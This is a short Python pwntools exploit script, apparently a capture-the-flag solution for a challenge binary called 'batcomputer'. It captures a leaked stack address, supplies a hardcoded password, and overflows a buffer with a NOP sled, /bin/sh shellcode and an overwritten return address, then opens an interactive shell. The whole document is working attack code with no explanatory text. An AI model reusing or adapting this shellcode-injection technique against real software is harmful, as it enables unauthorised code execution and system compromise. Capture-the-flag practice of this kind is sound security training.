from pwn import *

io = process('./batcomputer')

io.sendlineafter('>', '1')
addr = p64(int(io.recvline().split()[-1],16))

io.sendlineafter('>', '2')
io.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')

payload_size = 76+8
shellcode = asm(shellcraft.sh())
payload = '\x90'*10 + shellcode + 'A'*(payload_size - len(shellcode) - 10) + addr

io.sendlineafter('Enter the navigation commands:', payload)
io.sendlineafter('>', '3')
#print io.recvline()
io.interactive()
